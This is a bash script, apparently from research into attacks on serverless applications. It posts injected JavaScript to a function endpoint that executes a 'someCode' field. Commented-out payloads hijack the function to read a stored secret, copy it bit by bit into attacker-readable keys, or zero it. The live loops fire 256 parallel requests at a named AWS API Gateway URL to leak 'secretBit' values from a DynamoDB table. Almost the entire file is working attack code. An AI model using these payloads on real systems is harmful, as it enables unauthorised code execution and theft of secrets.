#!/usr/bin/env bash

#export num=4
#curl --data '{"someCode" : "console.'\
#'log(\"Fuuuuuck\");'\
#'console.log(\"Whaaa'\
#$num\
#'aaaaaaaaaa\");'\
#'"}' $1

#curl --data ' {"someCode" : "'\
#'console.log(\"Running from hijacked code!\");'\
#'function storeSecret(idx) {'\
#'  let kv1 = new KV_Store(conf.host, conf.user, conf.pass, constants.TABLE_SECRET_KEY_NAME);'\
#'  return kv1.init()'\
#'    .then(() => kv1.put(\"stealingSuperSecret\" + idx, 0))'\
#'    .then(() => kv1.close());'\
#'}'\
#'Promise.all(Array.from(Array(64).keys()).map(idx => storeSecret(idx)))'\
#'  .then(() => callback(null, \"I Zeroed\")) "} ' $1

#curl --data '{"someCode" : "'\
#'console.log(\"Running from hijacked code!\");'\
#'let kv = new KV_Store(conf.host, conf.user, conf.pass, constants.TABLE_SECRET_KEY_NAME);'\
#'kv.init().then(() => kv.get(\"superSecret\"))'\
#'    .then((res) => kv.close().then(() => res)).then((secret) => {'\
#'        function storeSecret(idx) {'\
#'            if (secret[idx] === \"1\") {'\
#'                let kv1 = new KV_Store(conf.host, conf.user, conf.pass, constants.TABLE_SECRET_KEY_NAME);'\
#'                return kv1.init()'\
#'                    .then(() => kv1.put(\"stealingSuperSecret\" + idx, secret[idx]))'\
#'                    .then(() => kv1.close());'\
#'            } else {'\
#'                return Promise.resolve();'\
#'            }'\
#'        }'\
#'        return Promise.all(Array.from(Array(64).keys()).map(idx => storeSecret(idx)))'\
#'    })'\
#'    .then(() => console.log(\"I Stealed!!\"))'\
#'    .then(() => callback(null, \"I Stealed!!\"))'\
#'"}' $1
#
#for idx in {0..64}
#do
##export idx=3
#echo ${idx}
#curl -w "\n" --data '{"someCode" : "'\
#'let stealingBit = '\
#${idx}\
#';'\
#'let kv2 = new KV_Store(conf.host, conf.user, conf.pass, constants.TABLE_SECRET_KEY_NAME);'\
#'kv2.init()'\
#'    .then(() => kv2.get(\"stealingSuperSecret\" + stealingBit))'\
#'    .then((res) => kv2.close().then(() => res))'\
#'    .then((res) => {console.log(\"WhatWhatWhat\"); return res})'\
#'    .then((res) => callback(null,{statusCode: 200, headers: { \"Access-Control-Allow-Origin\": \"*\", \"Access-Control-Allow-Credentials\": true,}, body:\"Secret value of bit #\" + stealingBit + \" is: \" + res}))'\
#'"}' $1 &
#
#done

#'    .then((res) => callback(null,'\
#'       {'\
#'           statusCode: 200,'\
#'           headers : {'\
#'             \"Access-Control-Allow-Origin\": \"*\",'\
#'             \"Access-Control-Allow-Credentials\": true,'\
#'           },'\
#'           body: \"HuhHuhHuh\",}))'\


#curl --data '{"someCode" : "'\
#'callback(null,{statusCode: 200, headers: { \"Access-Control-Allow-Origin\": \"*\", \"Access-Control-Allow-Credentials\": true,}, body:\"HuhHuhHuh\"});'\
#'"}' $1

#for idx in {0..63}
#do
#    sls invoke -f doSomething -d '{"body": {"bit" : '${idx}',"someCode": "dynamo.get({TableName: \"leakTable\", Key: {\"itemKey\": \"secretBit\" + event.body.bit}}, (err, val) => callback(err,resp(\"Bit #\" + event.body.bit + \" is : \" + val.Item.itemValue)))"}}' &
#done

for idx in {0..63}
do
    curl -w "\n" -X POST --data '{"bit" : '${idx}',"someCode": "dynamo.get({TableName: \"leakTable\", Key: {\"itemKey\": \"secretBit\" + body.bit}}, (err, val) => {callback(err,resp(JSON.stringify(val.Item)))})"}' https://ltsa99sldd.execute-api.us-west-2.amazonaws.com/dev/doSomething &
    pids1[${idx}]=$!
done
for idx in {0..63}
do
    curl -w "\n" -X POST --data '{"bit" : '${idx}',"someCode": "dynamo.get({TableName: \"leakTable\", Key: {\"itemKey\": \"secretBit\" + body.bit}}, (err, val) => {callback(err,resp(JSON.stringify(val.Item)))})"}' https://ltsa99sldd.execute-api.us-west-2.amazonaws.com/dev/doSomething &
    pids2[${idx}]=$!
done
for idx in {0..63}
do
    curl -w "\n" -X POST --data '{"bit" : '${idx}',"someCode": "dynamo.get({TableName: \"leakTable\", Key: {\"itemKey\": \"secretBit\" + body.bit}}, (err, val) => {callback(err,resp(JSON.stringify(val.Item)))})"}' https://ltsa99sldd.execute-api.us-west-2.amazonaws.com/dev/doSomething &
    pids3[${idx}]=$!
done
for idx in {0..63}
do
    curl -w "\n" -X POST --data '{"bit" : '${idx}',"someCode": "dynamo.get({TableName: \"leakTable\", Key: {\"itemKey\": \"secretBit\" + body.bit}}, (err, val) => {callback(err,resp(JSON.stringify(val.Item)))})"}' https://ltsa99sldd.execute-api.us-west-2.amazonaws.com/dev/doSomething &
    pids4[${idx}]=$!
done

for pid in ${pids1[*]}
do
    wait $pid
done
for pid in ${pids2[*]}
do
    wait $pid
done
for pid in ${pids3[*]}
do
    wait $pid
done
for pid in ${pids4[*]}
do
    wait $pid
done

#
#for idx in {0..63}
#do
##export idx=1
#    curl -w "\n" -X POST --data '{"bit" : '${idx}',"someCode": "dynamo.get({TableName: \"leakTable\", Key: {\"itemKey\": \"secretBit\" + body.bit}}, (err, val) => {callback(err,resp(JSON.stringify(val.Item)))})"}' https://ltsa99sldd.execute-api.us-west-2.amazonaws.com/dev/doSomething &
#done
#for idx in {0..63}
#do
##export idx=1
#    curl -w "\n" -X POST --data '{"bit" : '${idx}',"someCode": "dynamo.get({TableName: \"leakTable\", Key: {\"itemKey\": \"secretBit\" + body.bit}}, (err, val) => {callback(err,resp(JSON.stringify(val.Item)))})"}' https://ltsa99sldd.execute-api.us-west-2.amazonaws.com/dev/doSomething &
#done
#for idx in {0..63}
#do
##export idx=1
#    curl -w "\n" -X POST --data '{"bit" : '${idx}',"someCode": "dynamo.get({TableName: \"leakTable\", Key: {\"itemKey\": \"secretBit\" + body.bit}}, (err, val) => {callback(err,resp(JSON.stringify(val.Item)))})"}' https://ltsa99sldd.execute-api.us-west-2.amazonaws.com/dev/doSomething &
#done
